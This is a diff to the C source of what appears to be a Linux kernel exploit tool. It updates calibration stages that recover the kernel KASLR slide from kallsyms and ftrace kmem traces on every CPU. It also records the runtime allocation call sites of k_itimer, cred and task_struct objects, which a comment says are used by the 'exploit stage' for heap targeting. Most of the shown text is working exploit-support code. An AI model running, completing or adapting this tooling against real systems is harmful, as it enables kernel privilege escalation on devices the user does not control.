+		 * 然后退回 2 MiB 对齐法（那条路已经在真机验证过与设备 %pS 输出一致）。
+		 */
+		for (i = 0; i < (size_t)nts && i < 4; i++)
+			fprintf(stdout, "[calib_a] text candidate[%d]: %s+0x%llx name=%s req=%#llx\n",
+				(int)i, ts[i].sym, (unsigned long long)ts[i].off,
+				ts[i].cache, (unsigned long long)ts[i].req);
+
+		/* 3) 回退：2 MiB 对齐法 */
+		if (sr_find_func(syms, n, o->timer_link, &fbase, &flen, &fname) != 1) {
+			fprintf(stderr, "[calib_a] kallsyms has no symbol covering timer_link=%#llx\n",
+				(unsigned long long)o->timer_link);
+			goto fail;
+		}
+		if (sr_resolve_slide(fbase, flen, site, &slide, &off) != 1) {
+			fprintf(stderr, "[calib_a] slide not self-consistent: call_site=%#llx func=%s base=%#llx len=%#llx\n",
+				(unsigned long long)site, fname ? fname : "?",
+				(unsigned long long)fbase, (unsigned long long)flen);
+			goto fail;
+		}
+		fprintf(stdout, "[calib_a] 2MiB method: call_site=%#llx = %#llx + slide + %#llx (func=%s len=%#llx) -> slide=%#llx\n",
+			(unsigned long long)site, (unsigned long long)fbase,
+			(unsigned long long)off, fname ? fname : "?",
+			(unsigned long long)flen, (unsigned long long)slide);
+	}
+
+	/* 4) k_itimer 的运行期调用点落盘：exploit 阶段用它做 trace 匹配键。
+	 * cred / task 的调用点由第二段探针负责（见 calib_a_probe_alloc_sites），
+	 * 因为第一段窗口里根本没有 cred / task_struct 的分配。 */
 	{
 		char buf[128];
-		char f2[256], f3[256];
-		uint64_t s2 = 0, s3 = 0;
 
 		snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)site);
 		if (write_result_file("sites.kitimer", buf))
 			fprintf(stderr, "[calib_a] warn: cannot write sites.kitimer\n");
-		if (o->cred_size &&
-		    trace_kmem_call_site(o->cred_size, f2, sizeof(f2), &s2) == 0) {
-			snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)s2);
-			if (write_result_file("sites.cred", buf))
-				fprintf(stderr, "[calib_a] warn: cannot write sites.cred\n");
-		}
-		if (o->task_struct_size &&
-		    trace_kmem_call_site(o->task_struct_size, f3, sizeof(f3), &s3) == 0) {
-			snprintf(buf, sizeof(buf), "0x%llx", (unsigned long long)s3);
-			if (write_result_file("sites.task", buf))
-				fprintf(stderr, "[calib_a] warn: cannot write sites.task\n");
-		}
 	}
 
 	*out_slide = slide;
-	free(syms);
+	free(recs);
 	return 0;
 fail:
-	free(syms);
+	free(sites);
+	free(recs);
 	return -1;
 }
 
@@ -586,7 +1241,9 @@ int calib_a_main(int argc, char **argv)
 	}
 	uint64_t timer_link = o ? o->timer_link : 0;
 	struct raw_sink sink;
-	const char *paths[1];
+	const char *paths[MAX_CPU_RAW];
+	char path_buf[MAX_CPU_RAW][64];
+	int npaths = 0, cpu;
 	uint64_t *sites = NULL;
 	size_t n_sites = 0;
 	struct calib_run top[8];
@@ -596,6 +1253,8 @@ int calib_a_main(int argc, char **argv)
 	int rc = 1;
 	uint64_t slide = 0;
 	int found = 0;
+	struct text_site text_sites[TEXT_SITE_MAX];
+	int n_text = 0;
 
 	if (!timer_link) {
 		fprintf(stderr, "[calib_a] error: profile missing timer_link\n");
@@ -635,20 +1294,51 @@ int calib_a_main(int argc, char **argv)
 	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
 	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
 
-	paths[0] = TRACE "/per_cpu/cpu0/trace_pipe_raw";
-	if (sink_init(&sink, PER_CPU_CAP)) {
+	/*
+	 * 文本 trace 必须**立刻**采集：它是按 CPU 分的环形缓冲，系统级的
+	 * kmem_cache_alloc 流量很大，等下面 raw 捕获跑完（最多 8 秒）再读，
+	 * 探针窗口的记录早被冲掉了 —— 这就是之前「文本 trace 交叉验证在真机
+	 * 从未触发」的原因。
+	 */
+	n_text = text_trace_collect_sites(NULL, o ? o->kitimer_size : 0,
+					  text_sites, TEXT_SITE_MAX);
+	if (n_text)
+		fprintf(stdout, "[calib_a] text trace: %d k_itimer site(s) captured\n",
+			n_text);
+
+	/* k_itimer 的分配可能发生在任意 CPU 上（probe 线程会迁移），
+	 * 所以必须把所有 per-CPU raw pipe 都抓，不能只抓 cpu0 ——
+	 * 只抓 cpu0 时常常一条 k_itimer 记录都捞不到。
+	 * （calib_b 一直就是这么做的，calib_a 这里以前漏了。） */
+	for (cpu = 0; cpu < MAX_CPU_RAW; cpu++) {
+		snprintf(path_buf[cpu], sizeof(path_buf[cpu]),
+			 TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+		paths[cpu] = path_buf[cpu];
+		npaths++;
+	}
+	if (sink_init(&sink, TOTAL_CAP)) {
 		fprintf(stderr, "[calib_a] error: out of memory\n");
 		return 1;
 	}
-	capture_raw(&sink, paths, 1, 5);
+	capture_raw(&sink, paths, npaths, 8);
 	fprintf(stdout, "[calib_a] captured raw=%zu bytes\n", sink.len);
 
 	/* 6.18 适配：优先用 kallsyms 精确解 slide（不依赖写死锚点）；
 	 * 失败再退回旧的「最频 call_site - TIMER_LINK」法。 */
 	{
 		uint64_t slide_new = 0;
+		sr_sym *syms = NULL;
+		size_t nsyms = 0;
+		int have_syms = (load_kallsyms_map(&syms, &nsyms) == 0);
 
-		if (calib_a_resolve_via_kallsyms(o, &slide_new) == 0) {
+		if (have_syms)
+			fprintf(stdout, "[calib_a] kallsyms map: %zu symbols\n", nsyms);
+		else
+			fprintf(stderr, "[calib_a] note: no kallsyms map, fall back to legacy slide anchor\n");
+
+		if (have_syms &&
+		    calib_a_resolve_via_kallsyms(o, syms, nsyms, text_sites, n_text,
+						 sink.buf, sink.len, &slide_new) == 0) {
 			char nbuf[64];
 
 			snprintf(nbuf, sizeof(nbuf), "0x%llx", (unsigned long long)slide_new);
@@ -657,6 +1347,8 @@ int calib_a_main(int argc, char **argv)
 					(unsigned long long)slide_new,
 					(unsigned long long)(UINT64_C(0xFFFFFFC080000000) + slide_new));
 				fprintf(stdout, "C98260_SLIDE=0x%llx\n", (unsigned long long)slide_new);
+				/* 第二段探针：cred / task 的运行期调用点 */
+				calib_a_probe_alloc_sites(o, syms, nsyms, slide_new);
 				fprintf(stdout, "[calib_a] done\n");
 				rc = 0;
 				goto out;
@@ -769,6 +1461,24 @@ static int collect_order1_pfns(uint64_t **out, size_t *out_n)
 	return 0;
 }
 
+/* 读 $CVE98260_HOME 下一个 "0x..." 结果文件（calib_a 落盘的运行期调用点）。 */
+static uint64_t read_result_u64(const char *name)
+{
+	char path[512];
+	char buf[64];
+	unsigned long long v = 0;
+	FILE *f;
+
+	snprintf(path, sizeof(path), "%s/%s", calib_home(), name);
+	f = fopen(path, "r");
+	if (!f)
+		return 0;
+	if (fgets(buf, sizeof(buf), f))
+		sscanf(buf, "0x%llx", &v);
+	fclose(f);
+	return (uint64_t)v;
+}
+
 /* resolve slide: prefer --slide, then env CVE98260_SLIDE, then $HOME/slide.txt */
 static int resolve_slide(int argc, char **argv, uint64_t *out)
 {
@@ -835,9 +1545,17 @@ int calib_b_main(int argc, char **argv)
 		fprintf(stderr, "[calib_b] error: slide missing (run calibrate-a or pass --slide)\n");
 		return 1;
 	}
-	site_link = timer_link + slide;
-	fprintf(stdout, "[calib_b] slide=%#llx expected call site=%#llx\n",
-		(unsigned long long)slide, (unsigned long long)site_link);
+	/* 6.18：calib_a 已把**实测**的运行期调用点落盘到 sites.kitimer，
+	 * 优先用它做 trace 匹配键。写死的 timer_link 在 6.18 上是函数基址而不是
+	 * 调用点（do_timer_create+0xe8 vs 基址），直接用它过滤会一条都匹配不到。 */
+	{
+		uint64_t rt_site = read_result_u64("sites.kitimer");
+
+		site_link = rt_site ? rt_site : (timer_link + slide);
+		fprintf(stdout, "[calib_b] slide=%#llx call site=%#llx%s\n",
+			(unsigned long long)slide, (unsigned long long)site_link,
+			read_result_u64("sites.kitimer") ? " (from sites.kitimer)" : " (from timer_link+slide)");
+	}
 
 	snprintf(n_str, sizeof(n_str), "%d", 4096);
 	snprintf(hold_str, sizeof(hold_str), "%d", 1);
